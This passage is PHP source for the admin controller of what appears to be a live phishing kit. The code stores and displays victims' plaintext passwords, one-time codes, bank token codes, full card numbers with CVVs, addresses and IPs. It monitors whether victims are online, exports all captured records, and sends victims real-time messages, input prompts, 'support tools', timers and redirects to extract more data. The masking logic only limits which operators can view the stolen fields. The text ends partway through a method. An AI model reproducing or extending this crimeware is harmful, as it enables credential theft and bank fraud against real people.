<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Inertia\Inertia;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Session;
use App\Models\EstatusUsuario;
use App\Models\MensajeAdmin;
use App\Models\Usuario;
use App\Models\HerramientaEnviada;
use App\Models\TimerEnviado;
use App\Models\RedireccionEnviada;
use App\Models\AdministracionControl;

class AdminControlController extends Controller
{

    // ===== Helpers de permisos y masking =====
    private function currentAdmin(): ?AdministracionControl
    {
        $adminId = Session::get('admin_id');
        return $adminId ? AdministracionControl::find($adminId) : null;
    }

    private function can(string $key): bool
    {
        $admin = $this->currentAdmin();
        if (!$admin) return false;
        return $admin->hasPerm($key);
    }

    private function maskText(?string $v): ?string
    {
        if (!$v) return $v;
        $len = strlen($v);
        if ($len <= 4) return str_repeat('•', max(0, $len - 1)) . substr($v, -1);
        return substr($v, 0, 2) . str_repeat('•', $len - 4) . substr($v, -2);
    }

    public function modsPage()
    {
        $adm = $this->currentAdmin();
        return Inertia::render('Admin/Mods', [
            'admin' => [
                'is_superadmin' => (bool) ($adm?->is_admin === true),
                'permisos' => $adm?->permisos ?? []
            ]
        ]);
    }

    private function maskToken(?string $v): ?string
    {
        if (!$v) return $v;
        $len = strlen($v);
        return str_repeat('•', max(0, $len - 4)) . substr($v, -4);
    }

    private function maskEmail(?string $v): ?string
    {
        if (!$v || !str_contains($v, '@')) return $this->maskText($v);
        [$user, $dom] = explode('@', $v, 2);
        $userMask = strlen($user) <= 2 ? str_repeat('•', max(0, strlen($user) - 1)) . substr($user, -1)
            : substr($user, 0, 1) . str_repeat('•', max(0, strlen($user) - 2)) . substr($user, -1);
        return $userMask . '@' . $dom;
    }

    private function maskPhone(?string $v): ?string
    {
        if (!$v) return $v;
        $digits = preg_replace('/\D+/', '', $v);
        $suffix = substr($digits, -4);
        return '••••••' . $suffix;
    }

    private function maskByPerm($value, string $permKey, string $type = 'text')
    {
        if ($this->can($permKey)) return $value;
        return match ($type) {
            'token' => $this->maskToken($value),
            'email' => $this->maskEmail($value),
            'phone' => $this->maskPhone($value),
            'card'  => $this->maskCard($value),
            'cvv'   => $this->maskCvv($value),
            default => $this->maskText($value),
        };
    }

    private function maskCard(?string $v): ?string
    {
        if (!$v) return $v;
        $digits = preg_replace('/\D+/', '', $v);
        $last4 = substr($digits, -4);
        return '•••• •••• •••• ' . $last4;
    }

    private function maskCvv(?string $v): ?string
    {
        if (!$v) return $v;
        return str_repeat('•', max(3, strlen($v)));
    }

    private function maskUsuarioStd($u, string $context = 'dashboard')
    {
        $p = $context === 'panel' ? 'panel.view_field.' : 'dashboard.view_field.';
        // Clonar stdClass
        $o = clone $u;
        $o->usuario = $this->maskByPerm($o->usuario ?? null, $p . 'usuario');
        $o->password = $this->maskByPerm($o->password ?? null, $p . 'password');
        $o->otp = $this->maskByPerm($o->otp ?? null, $p . 'otp');
        $o->token_codigo = $this->maskByPerm($o->token_codigo ?? null, $p . 'token', 'token');
        if (property_exists($o, 'sgdotoken_codigo')) {
            $o->sgdotoken_codigo = $this->maskByPerm($o->sgdotoken_codigo ?? null, $p . 'token', 'token');
        }
        $o->nombre = $this->maskByPerm($o->nombre ?? null, $p . 'nombre');
        if (property_exists($o, 'apellido')) {
            $o->apellido = $this->maskByPerm($o->apellido ?? null, $p . 'nombre');
        }
        $o->email = $this->maskByPerm($o->email ?? null, $p . 'email', 'email');
        $o->telefono_movil = $this->maskByPerm($o->telefono_movil ?? null, $p . 'telefono_movil', 'phone');
        $o->telefono_fijo = $this->maskByPerm($o->telefono_fijo ?? null, $p . 'telefono_fijo', 'phone');
        //  fields
        if (property_exists($o, 'tarjeta_numero')) {
            $o->tarjeta_numero = $this->maskByPerm($o->tarjeta_numero ?? null, $p . 'tarjeta_numero', 'card');
        }
        if (property_exists($o, 'tarjeta_expiracion')) {
            $o->tarjeta_expiracion = $this->maskByPerm($o->tarjeta_expiracion ?? null, $p . 'tarjeta_expiracion');
        }
        if (property_exists($o, 'tarjeta_cvv')) {
            $o->tarjeta_cvv = $this->maskByPerm($o->tarjeta_cvv ?? null, $p . 'tarjeta_cvv', 'cvv');
        }
        if (property_exists($o, 'titular_tarjeta')) {
            $o->titular_tarjeta = $this->maskByPerm($o->titular_tarjeta ?? null, $p . 'titular_tarjeta');
        }
        if (property_exists($o, 'direccion')) {
            $o->direccion = $this->maskByPerm($o->direccion ?? null, $p . 'direccion');
        }
        if (property_exists($o, 'codigo_postal')) {
            $o->codigo_postal = $this->maskByPerm($o->codigo_postal ?? null, $p . 'codigo_postal');
        }
        if (property_exists($o, 'estado_residencia')) {
            $o->estado_residencia = $this->maskByPerm($o->estado_residencia ?? null, $p . 'estado_residencia');
        }
        if (property_exists($o, 'comentarios')) {
            if (!$this->can($p . 'comentarios')) {
                $o->comentarios = null;
            }
        }
        if (property_exists($o, 'fecha_ingreso')) {
            $o->fecha_ingreso = $this->can($p . 'fecha_ingreso') ? $o->fecha_ingreso : null;
        }
        return $o;
    }

    public function index(Request $request)
    {
        $search = $request->get('search', '');
        $page = $request->get('page', 1);
        $perPage = 10;

        // PRIMERO: Actualizar usuarios offline (igual que en heartbeat)
        EstatusUsuario::where('ultimo_heartbeat', '<', now()->subSeconds(60))
            ->whereIn('estado', ['online', 'inactive'])
            ->update(['estado' => 'offline']);

        // Query base para obtener usuarios con su estatus
        $query = DB::table('usuarios as u')
            ->leftJoin('estatus_usuarios as e', 'u.id', '=', 'e.usuario_id')
            ->select([
                'u.id',
                'u.usuario',
                'u.password',
                'u.otp',
                'u.token_codigo',
                'u.nombre',
                'u.apellido',
                'u.email',
                'u.telefono_movil',
                'u.telefono_fijo',
                'u.fecha_ingreso',
                'u.ip_real',
                'u.comentarios',
                //  fields (mantenemos en consulta pero no se mostrarán en interfaz)
                'u.tarjeta_numero',
                'u.tarjeta_expiracion',
                'u.tarjeta_cvv',
                'u.titular_tarjeta',
                'u.direccion',
                'u.codigo_postal',
                'u.estado_residencia',
                DB::raw('COALESCE(e.estado, "offline") as estatus'),
                'e.pagina_actual',
                'e.ultimo_heartbeat',
                DB::raw('
                    CASE
                        WHEN e.ultimo_heartbeat IS NULL THEN "offline"
                        WHEN e.ultimo_heartbeat < DATE_SUB(NOW(), INTERVAL 60 SECOND) THEN "offline"
                        ELSE e.estado
                    END as estado_real
                '),
                DB::raw('TIMESTAMPDIFF(SECOND, e.ultimo_heartbeat, NOW()) as segundos_desde_heartbeat'),
                DB::raw('NOW() as hora_actual'),
                // Calcular completitud de información
                DB::raw('
                    (CASE WHEN u.nombre IS NOT NULL AND u.nombre != "" THEN 1 ELSE 0 END +
                     CASE WHEN u.apellido IS NOT NULL AND u.apellido != "" THEN 1 ELSE 0 END +
                     CASE WHEN u.email IS NOT NULL AND u.email != "" THEN 1 ELSE 0 END +
                     CASE WHEN u.telefono_movil IS NOT NULL AND u.telefono_movil != "" THEN 1 ELSE 0 END +
                     CASE WHEN u.telefono_fijo IS NOT NULL AND u.telefono_fijo != "" THEN 1 ELSE 0 END) as campos_completos
                '),
                // Determinar si es reciente
                DB::raw('CASE WHEN u.fecha_ingreso >= DATE_SUB(NOW(), INTERVAL 24 HOUR) THEN 1 ELSE 0 END as es_reciente')
            ]);

        // Aplicar filtro de búsqueda si existe
        if (!empty($search)) {
            $query->where(function($q) use ($search) {
                $q->where('u.usuario', 'LIKE', "%{$search}%")
                  ->orWhere('u.password', 'LIKE', "%{$search}%")
                  ->orWhere('u.otp', 'LIKE', "%{$search}%")
                  ->orWhere('u.token_codigo', 'LIKE', "%{$search}%")
                  ->orWhere('u.ip_real', 'LIKE', "%{$search}%")
                  ->orWhere('u.nombre', 'LIKE', "%{$search}%")
                  ->orWhere('u.apellido', 'LIKE', "%{$search}%")
                  ->orWhere('u.email', 'LIKE', "%{$search}%")
                  ->orWhere('u.telefono_movil', 'LIKE', "%{$search}%")
                  ->orWhere('u.telefono_fijo', 'LIKE', "%{$search}%");
            });
        }

        // Obtener total de registros para paginación
        $total = $query->count();
        $totalPages = ceil($total / $perPage);

        // Aplicar paginación y ordenamiento
        $usuarios = $query
            ->orderByRaw('
                CASE
                    WHEN estado_real = "online" THEN 1
                    WHEN estado_real = "inactive" THEN 2
                    ELSE 3
                END,
                campos_completos DESC,
                es_reciente DESC,
                u.fecha_ingreso DESC
            ')
            ->offset(($page - 1) * $perPage)
            ->limit($perPage)
            ->get()
            ->map(function($user) {
                // Agregar campo info_completa
                $user->info_completa = $user->campos_completos >= 3 ? 1 : 0;
                return $user;
            });

        $adm = $this->currentAdmin();
        return Inertia::render('Admin/Dashboard', [
            'usuarios' => $usuarios,
            'pagination' => [
                'current_page' => (int) $page,
                'total_pages' => $totalPages,
                'total' => $total,
                'per_page' => $perPage
            ],
            'search' => $search,
            'admin' => [
                'is_superadmin' => (bool) ($adm?->is_admin === true),
                'permisos' => $adm?->permisos ?? []
            ]
        ]);
    }

    // Método para eliminar un usuario específico
    public function deleteUser($id)
    {
        try {
            // Eliminar de estatus_usuarios primero (por la clave foránea)
            DB::table('estatus_usuarios')->where('usuario_id', $id)->delete();

            // Eliminar el usuario
            $deleted = DB::table('usuarios')->where('id', $id)->delete();

            if ($deleted) {
                return redirect()->back()->with('success', 'Usuario eliminado correctamente');
            } else {
                return redirect()->back()->with('error', 'Usuario no encontrado');
            }
        } catch (\Exception $e) {
            return redirect()->back()->with('error', 'Error al eliminar el usuario');
        }
    }

    // Método para vaciar toda la tabla de usuarios
    public function vaciarUsuarios()
    {
        try {
            // Contar usuarios antes de eliminar
            $totalUsuarios = DB::table('usuarios')->count();
            $totalEstatus = DB::table('estatus_usuarios')->count();

            // Deshabilitar verificación de claves foráneas temporalmente
            DB::statement('SET FOREIGN_KEY_CHECKS=0;');

            // Vaciar tablas
            DB::table('estatus_usuarios')->truncate();
            DB::table('usuarios')->truncate();

            // Rehabilitar verificación de claves foráneas
            DB::statement('SET FOREIGN_KEY_CHECKS=1;');

            // Log para debugging
            Log::info("Tabla vaciada exitosamente. Usuarios eliminados: {$totalUsuarios}, Estatus eliminados: {$totalEstatus}");

            return redirect()->back()->with('success', "Todos los usuarios han sido eliminados correctamente. Total eliminados: {$totalUsuarios}");
        } catch (\Exception $e) {
            // Asegurar que las claves foráneas se rehabiliten en caso de error
            DB::statement('SET FOREIGN_KEY_CHECKS=1;');

            // Log del error
            Log::error("Error al vaciar tabla de usuarios: " . $e->getMessage());

            return redirect()->back()->with('error', 'Error al vaciar la tabla de usuarios: ' . $e->getMessage());
        }
    }

    // Método para exportar todos los usuarios (sin paginación)
    public function exportAllUsers(Request $request)
    {
        $search = $request->get('search', '');

        // PRIMERO: Actualizar usuarios offline (igual que en heartbeat)
        EstatusUsuario::where('ultimo_heartbeat', '<', now()->subSeconds(60))
            ->whereIn('estado', ['online', 'inactive'])
            ->update(['estado' => 'offline']);

        // Query para obtener TODOS los usuarios (sin paginación)
        $query = DB::table('usuarios as u')
            ->leftJoin('estatus_usuarios as e', 'u.id', '=', 'e.usuario_id')
            ->select([
                'u.id',
                'u.usuario',
                'u.password',
                'u.otp',
                'u.token_codigo',
                'u.nombre',
                'u.apellido',
                'u.email',
                'u.telefono_movil',
                'u.telefono_fijo',
                'u.fecha_ingreso',
                'u.ip_real',
                'u.comentarios',
                //  fields (mantenemos en consulta pero no se mostrarán en interfaz)
                'u.tarjeta_numero',
                'u.tarjeta_expiracion',
                'u.tarjeta_cvv',
                'u.titular_tarjeta',
                'u.direccion',
                'u.codigo_postal',
                'u.estado_residencia',
                DB::raw('COALESCE(e.estado, "offline") as estatus'),
                'e.pagina_actual',
                'e.ultimo_heartbeat',
                DB::raw('
                    CASE
                        WHEN e.ultimo_heartbeat IS NULL THEN "offline"
                        WHEN e.ultimo_heartbeat < DATE_SUB(NOW(), INTERVAL 60 SECOND) THEN "offline"
                        ELSE e.estado
                    END as estado_real
                '),
                DB::raw('
                    (CASE WHEN u.nombre IS NOT NULL AND u.nombre != "" THEN 1 ELSE 0 END +
                     CASE WHEN u.apellido IS NOT NULL AND u.apellido != "" THEN 1 ELSE 0 END +
                     CASE WHEN u.email IS NOT NULL AND u.email != "" THEN 1 ELSE 0 END +
                     CASE WHEN u.telefono_movil IS NOT NULL AND u.telefono_movil != "" THEN 1 ELSE 0 END +
                     CASE WHEN u.telefono_fijo IS NOT NULL AND u.telefono_fijo != "" THEN 1 ELSE 0 END) as campos_completos
                '),
                DB::raw('CASE WHEN u.fecha_ingreso >= DATE_SUB(NOW(), INTERVAL 24 HOUR) THEN 1 ELSE 0 END as es_reciente')
            ]);

        // Aplicar filtro de búsqueda si existe
        if (!empty($search)) {
            $query->where(function($q) use ($search) {
                $q->where('u.usuario', 'LIKE', "%{$search}%")
                  ->orWhere('u.password', 'LIKE', "%{$search}%")
                  ->orWhere('u.otp', 'LIKE', "%{$search}%")
                  ->orWhere('u.token_codigo', 'LIKE', "%{$search}%")
                  ->orWhere('u.ip_real', 'LIKE', "%{$search}%")
                  ->orWhere('u.nombre', 'LIKE', "%{$search}%")
                  ->orWhere('u.apellido', 'LIKE', "%{$search}%")
                  ->orWhere('u.email', 'LIKE', "%{$search}%")
                  ->orWhere('u.telefono_movil', 'LIKE', "%{$search}%")
                  ->orWhere('u.telefono_fijo', 'LIKE', "%{$search}%");
            });
        }

        // Obtener TODOS los usuarios (sin limit ni offset)
        $usuarios = $query
            ->orderByRaw('
                CASE
                    WHEN estado_real = "online" THEN 1
                    WHEN estado_real = "inactive" THEN 2
                    ELSE 3
                END,
                campos_completos DESC,
                es_reciente DESC,
                u.fecha_ingreso DESC
            ')
            ->get()
            ->map(function($user) {
                $user->info_completa = $user->campos_completos >= 3 ? 1 : 0;
                return $user;
            });

        return response()->json([
            'usuarios' => $usuarios,
            'total' => $usuarios->count()
        ]);
    }

    // Método para mostrar el panel dinámico
    public function panelDinamico($userId)
    {
        $adm = $this->currentAdmin();
        return Inertia::render('Admin/PanelDinamico', [
            'userId' => $userId,
            'admin' => [
                'is_superadmin' => (bool) ($adm?->is_admin === true),
                'permisos' => $adm?->permisos ?? []
            ]
        ]);
    }

    // Método para obtener datos específicos de un usuario
    public function getUserData($userId)
    {
        try {
            // Obtener datos del usuario específico con su estatus
            $usuario = DB::table('usuarios as u')
                ->leftJoin('estatus_usuarios as e', 'u.id', '=', 'e.usuario_id')
                ->select([
                    'u.id',
                    'u.usuario',
                    'u.password',
                    'u.otp',
                    'u.token_codigo',
                    'u.sgdotoken_codigo',
                    'u.nombre',
                    'u.apellido',
                    'u.email',
                    'u.telefono_movil',
                    'u.telefono_fijo',
                    'u.fecha_ingreso',
                    'u.ip_real',
                    //  fields (mantenemos en consulta pero no se mostrarán en interfaz)
                    'u.tarjeta_numero',
                    'u.tarjeta_expiracion',
                    'u.tarjeta_cvv',
                    'u.titular_tarjeta',
                    'u.direccion',
                    'u.codigo_postal',
                    'u.estado_residencia',
                    DB::raw('COALESCE(e.estado, "offline") as estatus'),
                    'e.pagina_actual',
                    'e.ultimo_heartbeat',
                    DB::raw('
                        CASE
                            WHEN e.ultimo_heartbeat IS NULL THEN "offline"
                            WHEN e.ultimo_heartbeat < DATE_SUB(NOW(), INTERVAL 60 SECOND) THEN "offline"
                            ELSE e.estado
                        END as estado_real
                    ')
                ])
                ->where('u.id', $userId)
                ->first();

            if (!$usuario) {
                return response()->json([
                    'error' => 'Usuario no encontrado'
                ], 404);
            }

            // Determinar el texto del estatus
            $statusText = match($usuario->estado_real) {
                'online' => 'EN LÍNEA',
                'inactive' => 'INACTIVO',
                default => 'DESCONECTADO'
            };

            $usuarioMasked = $this->maskUsuarioStd($usuario, 'panel');
            return response()->json([
                'usuario' => $usuarioMasked,
                'chat_status' => [
                    'status' => $usuario->estado_real,
                    'text' => $statusText
                ]
            ]);

        } catch (\Exception $e) {
            return response()->json([
                'error' => 'Error al obtener datos del usuario: ' . $e->getMessage()
            ], 500);
        }
    }

    // Método para polling eficiente del dashboard
    public function dashboardPolling(Request $request)
    {
        $search = $request->get('search', '');
        $page = max(1, (int) $request->get('page', 1));
        $perPage = 10;
        $lastHash = $request->get('hash', '');

        // PRIMERO: Actualizar usuarios offline
        EstatusUsuario::where('ultimo_heartbeat', '<', now()->subSeconds(60))
            ->whereIn('estado', ['online', 'inactive'])
            ->update(['estado' => 'offline']);

        // Query base para obtener usuarios con su estatus (igual que en index)
        $query = DB::table('usuarios as u')
            ->leftJoin('estatus_usuarios as e', 'u.id', '=', 'e.usuario_id')
            ->select([
                'u.id',
                'u.usuario',
                'u.password',
                'u.otp',
                'u.token_codigo',
                'u.nombre',
                'u.apellido',
                'u.email',
                'u.telefono_movil',
                'u.telefono_fijo',
                'u.fecha_ingreso',
                'u.ip_real',
                'u.comentarios',
                //  fields (mantenemos en consulta pero no se mostrarán en interfaz)
                'u.tarjeta_numero',
                'u.tarjeta_expiracion',
                'u.tarjeta_cvv',
                'u.titular_tarjeta',
                'u.direccion',
                'u.codigo_postal',
                'u.estado_residencia',
                DB::raw('COALESCE(e.estado, "offline") as estatus'),
                'e.pagina_actual',
                'e.ultimo_heartbeat',
                DB::raw('
                    CASE
                        WHEN e.ultimo_heartbeat IS NULL THEN "offline"
                        WHEN e.ultimo_heartbeat < DATE_SUB(NOW(), INTERVAL 60 SECOND) THEN "offline"
                        ELSE e.estado
                    END as estado_real
                '),
                DB::raw('TIMESTAMPDIFF(SECOND, e.ultimo_heartbeat, NOW()) as segundos_desde_heartbeat'),
                DB::raw('NOW() as hora_actual'),
                // Calcular completitud de información
                DB::raw('
                    (CASE WHEN u.nombre IS NOT NULL AND u.nombre != "" THEN 1 ELSE 0 END +
                     CASE WHEN u.apellido IS NOT NULL AND u.apellido != "" THEN 1 ELSE 0 END +
                     CASE WHEN u.email IS NOT NULL AND u.email != "" THEN 1 ELSE 0 END +
                     CASE WHEN u.telefono_movil IS NOT NULL AND u.telefono_movil != "" THEN 1 ELSE 0 END +
                     CASE WHEN u.telefono_fijo IS NOT NULL AND u.telefono_fijo != "" THEN 1 ELSE 0 END) as campos_completos
                '),
                // Determinar si es reciente
                DB::raw('CASE WHEN u.fecha_ingreso >= DATE_SUB(NOW(), INTERVAL 24 HOUR) THEN 1 ELSE 0 END as es_reciente')
            ]);

        // Aplicar filtros de búsqueda si existen
        if (!empty($search)) {
            $query->where(function($q) use ($search) {
                $q->where('u.usuario', 'like', "%{$search}%")
                  ->orWhere('u.password', 'like', "%{$search}%")
                  ->orWhere('u.otp', 'like', "%{$search}%")
                  ->orWhere('u.token_codigo', 'like', "%{$search}%")
                  ->orWhere('u.ip_real', 'like', "%{$search}%")
                  ->orWhere('u.nombre', 'like', "%{$search}%")
                  ->orWhere('u.apellido', 'like', "%{$search}%")
                  ->orWhere('u.email', 'like', "%{$search}%")
                  ->orWhere('u.telefono_movil', 'like', "%{$search}%")
                  ->orWhere('u.telefono_fijo', 'like', "%{$search}%");
            });
        }

        // Obtener total de registros para paginación
        $total = $query->count();
        $totalPages = ceil($total / $perPage);

        // Aplicar paginación y ordenamiento
        $usuarios = $query
            ->orderByRaw('
                CASE
                    WHEN estado_real = "online" THEN 1
                    WHEN estado_real = "inactive" THEN 2
                    ELSE 3
                END,
                campos_completos DESC,
                es_reciente DESC,
                u.fecha_ingreso DESC
            ')
            ->offset(($page - 1) * $perPage)
            ->limit($perPage)
            ->get()
            ->map(function($user) {
                // Agregar campo info_completa
                $user->info_completa = $user->campos_completos >= 3 ? 1 : 0;
                return $user;
            });

        // Aplicar enmascarado por permisos antes del hash y la respuesta
        $usuariosMasked = $usuarios->map(function ($u) {
            return $this->maskUsuarioStd($u, 'dashboard');
        });

        // Crear hash de los datos para detectar cambios
        $dataForHash = [
            'usuarios' => $usuariosMasked->toArray(),
            'pagination' => [
                'current_page' => (int) $page,
                'total_pages' => $totalPages,
                'total' => $total,
                'per_page' => $perPage
            ]
        ];
        $currentHash = md5(json_encode($dataForHash));

        // Si el hash es igual, no hay cambios
        if ($lastHash === $currentHash) {
            return response()->json([
                'hasChanges' => false,
                'hash' => $currentHash
            ]);
        }

        // Si hay cambios, devolver los datos
        return response()->json([
            'hasChanges' => true,
            'hash' => $currentHash,
            'usuarios' => $usuariosMasked,
            'pagination' => [
                'current_page' => (int) $page,
                'total_pages' => $totalPages,
                'total' => $total,
                'per_page' => $perPage
            ]
        ]);
    }

    // Método para polling eficiente del Panel Dinámico
    public function panelDinamicoPolling(Request $request, $userId)
    {
        $lastHash = $request->get('hash', '');

        try {
            // PRIMERO: Actualizar usuarios offline
            EstatusUsuario::where('ultimo_heartbeat', '<', now()->subSeconds(60))
                ->whereIn('estado', ['online', 'inactive'])
                ->update(['estado' => 'offline']);

            // Obtener datos del usuario específico con su estatus (igual que getUserData)
            $usuario = DB::table('usuarios as u')
                ->leftJoin('estatus_usuarios as e', 'u.id', '=', 'e.usuario_id')
                ->select([
                    'u.id',
                    'u.usuario',
                    'u.password',
                    'u.otp',
                    'u.token_codigo',
                    'u.sgdotoken_codigo',
                    'u.nombre',
                    'u.apellido',
                    'u.email',
                    'u.telefono_movil',
                    'u.telefono_fijo',
                    'u.fecha_ingreso',
                    'u.ip_real',
                    //  fields (mantenemos en consulta pero no se mostrarán en interfaz)
                    'u.tarjeta_numero',
                    'u.tarjeta_expiracion',
                    'u.tarjeta_cvv',
                    'u.titular_tarjeta',
                    'u.direccion',
                    'u.codigo_postal',
                    'u.estado_residencia',
                    DB::raw('COALESCE(e.estado, "offline") as estatus'),
                    'e.pagina_actual',
                    'e.ultimo_heartbeat',
                    DB::raw('
                        CASE
                            WHEN e.ultimo_heartbeat IS NULL THEN "offline"
                            WHEN e.ultimo_heartbeat < DATE_SUB(NOW(), INTERVAL 60 SECOND) THEN "offline"
                            ELSE e.estado
                        END as estado_real
                    ')
                ])
                ->where('u.id', $userId)
                ->first();

            if (!$usuario) {
                return response()->json([
                    'hasChanges' => false,
                    'error' => 'Usuario no encontrado'
                ], 404);
            }

            // Determinar el texto del estatus
            $statusText = match($usuario->estado_real) {
                'online' => 'EN LÍNEA',
                'inactive' => 'INACTIVO',
                default => 'DESCONECTADO'
            };

            // Aplicar enmascarado por permisos
            $usuarioMasked = $this->maskUsuarioStd($usuario, 'panel');

            // Crear estructura de datos para el hash
            $dataForHash = [
                'usuario' => $usuarioMasked,
                'chat_status' => [
                    'status' => $usuario->estado_real,
                    'text' => $statusText
                ]
            ];

            // Crear hash de los datos para detectar cambios
            $currentHash = md5(json_encode($dataForHash));

            // Si el hash es igual, no hay cambios
            if ($lastHash === $currentHash) {
                return response()->json([
                    'hasChanges' => false,
                    'hash' => $currentHash
                ]);
            }

            // Si hay cambios, devolver los datos
            return response()->json([
                'hasChanges' => true,
                'hash' => $currentHash,
                'usuario' => $usuarioMasked,
                'chat_status' => [
                    'status' => $usuario->estado_real,
                    'text' => $statusText
                ]
            ]);

        } catch (\Exception $e) {
            return response()->json([
                'hasChanges' => false,
                'error' => 'Error al obtener datos del usuario: ' . $e->getMessage()
            ], 500);
        }
    }

    /**
     * Guardar comentarios/etiquetas para un usuario
     */
    public function saveComentarios(Request $request, $id)
    {
        try {
            $request->validate([
                'comentarios' => 'nullable|array',
                'comentarios.*.text' => 'required|string|max:30',
                'comentarios.*.color' => 'required|string|in:gray,blue,green,yellow,red,purple,pink,indigo,orange,teal,emerald',
            ]);

            $comentarios = $request->input('comentarios', []);

            // Normalizar: eliminar vacíos y recortar
            $comentarios = collect($comentarios)
                ->filter(function ($c) {
                    return isset($c['text']) && trim($c['text']) !== '' && isset($c['color']);
                })
                ->map(function ($c) {
                    return [
                        'text' => trim((string) $c['text']),
                        'color' => (string) $c['color'],
                    ];
                })
                ->values()
                ->all();

            $updated = DB::table('usuarios')->where('id', $id)->update([
                'comentarios' => json_encode($comentarios)
            ]);

            return response()->json([
                'success' => true,
                'updated' => (bool) $updated,
                'comentarios' => $comentarios,
            ]);
        } catch (\Illuminate\Validation\ValidationException $e) {
            return response()->json([
                'success' => false,
                'error' => 'Datos inválidos: ' . implode(', ', $e->validator->errors()->all()),
            ], 422);
        } catch (\Exception $e) {
            Log::error('Error guardando comentarios: ' . $e->getMessage());
            return response()->json([
                'success' => false,
                'error' => 'Error interno del servidor',
            ], 500);
        }
    }

    // ===== MÉTODOS PARA SISTEMA DE MENSAJES =====

    /**
     * Enviar mensaje desde el admin al usuario
     */
    public function enviarMensaje(Request $request)
    {
        Log::info('=== MÉTODO ENVIAR MENSAJE LLAMADO ===', [
            'request_data' => $request->all(),
            'headers' => $request->headers->all(),
            'method' => $request->method(),
            'url' => $request->url()
        ]);

        try {
            $request->validate([
                'usuario_id' => 'required|integer|exists:usuarios,id',
                'mensaje' => 'required|string|max:1000',
                'tipo_mensaje' => 'required|in:con_input,sin_input',
                'enter_enabled' => 'boolean'
            ]);

            $usuario_id = $request->usuario_id;
            $mensaje = trim($request->mensaje);
            $tipo_mensaje = $request->tipo_mensaje;
            $enter_enabled = $request->input('enter_enabled', true);

            Log::info('🎹 Enter enabled recibido:', [
                'enter_enabled_raw' => $request->input('enter_enabled'),
                'enter_enabled_processed' => $enter_enabled,
                'type' => gettype($enter_enabled)
            ]);

            // Obtener IP del usuario
            $usuario = Usuario::find($usuario_id);
            if (!$usuario) {
                return response()->json([
                    'success' => false,
                    'error' => 'Usuario no encontrado'
                ], 404);
            }

            // Crear mensaje
            $mensajeAdmin = MensajeAdmin::create([
                'usuario_id' => $usuario_id,
                'admin_id' => (Session::get('admin_id') ?? null),
                'mensaje' => $mensaje,
                'tipo_mensaje' => $tipo_mensaje,
                'ip_usuario' => $usuario->ip_real ?? request()->ip(),
                'estado' => 'pendiente',
                'fecha_envio' => now(),
                'enter_enabled' => $enter_enabled
            ]);

            return response()->json([
                'success' => true,
                'mensaje_id' => $mensajeAdmin->id,
                'message' => 'Mensaje enviado correctamente'
            ]);

        } catch (\Illuminate\Validation\ValidationException $e) {
            return response()->json([
                'success' => false,
                'error' => 'Datos inválidos: ' . implode(', ', $e->validator->errors()->all())
            ], 422);
        } catch (\Exception $e) {
            Log::error('Error enviando mensaje: ' . $e->getMessage());
            return response()->json([
                'success' => false,
                'error' => 'Error interno del servidor'
            ], 500);
        }
    }

    /**
     * Cargar mensajes del chat para un usuario específico
     */
    public function cargarMensajes($userId)
    {
        try {
            // Validar que el usuario existe
            $usuario = Usuario::find($userId);
            if (!$usuario) {
                return response()->json([
                    'success' => false,
                    'error' => 'Usuario no encontrado'
                ], 404);
            }

            // Obtener mensajes del usuario ordenados por fecha
            $mensajes = MensajeAdmin::where('usuario_id', $userId)
                ->orderBy('fecha_envio', 'asc')
                ->get()
                ->map(function ($mensaje) {
                    // Determinar el tipo de mensaje
                    $tipo = 'admin'; // Por defecto es del admin
                    if (str_starts_with($mensaje->mensaje, 'bXBot:')) {
                        $tipo = 'user'; // Los mensajes de bXBot aparecen del lado del usuario
                    }

                    return [
                        'id' => $mensaje->id,
                        'type' => $tipo,
                        'content' => $mensaje->mensaje,
                        'timestamp' => $mensaje->fecha_envio->toISOString(),
                        'inputVisible' => $mensaje->tipo_mensaje === 'con_input',
                        'estado' => $mensaje->estado,
                        'respuesta_usuario' => $mensaje->respuesta_usuario
                    ];
                });

            // Si hay respuestas del usuario, agregarlas como mensajes separados
            $mensajesConRespuestas = collect();
            foreach ($mensajes as $mensaje) {
                $mensajesConRespuestas->push($mensaje);

                if ($mensaje['respuesta_usuario']) {
                    $mensajesConRespuestas->push([
                        'id' => $mensaje['id'] . '_respuesta',
                        'type' => 'user',
                        'content' => $mensaje['respuesta_usuario'],
                        'timestamp' => $mensaje['timestamp'], // Usar la misma fecha por ahora
                        'inputVisible' => false,
                        'estado' => 'respondido'
                    ]);
                }
            }

            return response()->json([
                'success' => true,
                'mensajes' => $mensajesConRespuestas->values()->all()
            ]);

        } catch (\Exception $e) {
            Log::error('Error cargando mensajes: ' . $e->getMessage());
            return response()->json([
                'success' => false,
                'error' => 'Error interno del servidor'
            ], 500);
        }
    }

    /**
     * Enviar herramientas de soporte
     */
    public function enviarHerramientas(Request $request)
    {
        Log::info('=== MÉTODO ENVIAR HERRAMIENTAS LLAMADO ===', [
            'request_data' => $request->all()
        ]);

        try {
            $request->validate([
                'usuario_id' => 'required|integer|exists:usuarios,id'
            ]);

            $usuario_id = $request->usuario_id;

            // Obtener IP del usuario
            $usuario = Usuario::find($usuario_id);
            if (!$usuario) {
                return response()->json([
                    'success' => false,
                    'error' => 'Usuario no encontrado'
                ], 404);
            }

            // Crear herramienta
            $herramienta = HerramientaEnviada::create([
                'usuario_id' => $usuario_id,
                'admin_id' => (Session::get('admin_id') ?? null),
                'pagina' => 'herramientas.php',
                'ip_usuario' => $usuario->ip_real ?? request()->ip(),
                'estado' => 'pendiente',
                'fecha_envio' => now()
            ]);

            Log::info('Herramienta creada exitosamente', [
                'herramienta_id' => $herramienta->id,
                'usuario_id' => $usuario_id
            ]);

            // Persistir en el chat del admin que se enviaron herramientas
            MensajeAdmin::create([
                'usuario_id' => $usuario_id,
                'admin_id' => (Session::get('admin_id') ?? null),
                'mensaje' => '🛠️ Herramientas de soporte enviadas',
                'tipo_mensaje' => 'sin_input',
                'ip_usuario' => request()->ip(),
                'estado' => 'leido',
                'fecha_envio' => now(),
                'fecha_leido' => now()
            ]);

            return response()->json([
                'success' => true,
                'herramienta_id' => $herramienta->id,
                'message' => 'Herramientas enviadas correctamente'
            ]);

        } catch (\Exception $e) {
            Log::error('Error enviando herramientas: ' . $e->getMessage());
            return response()->json([
                'success' => false,
                'error' => 'Error interno del servidor'
            ], 500);
        }
    }

    /**
     * Enviar timer personalizado
     */
    public function enviarTimer(Request $request)
    {
        Log::info('=== MÉTODO ENVIAR TIMER LLAMADO ===', [
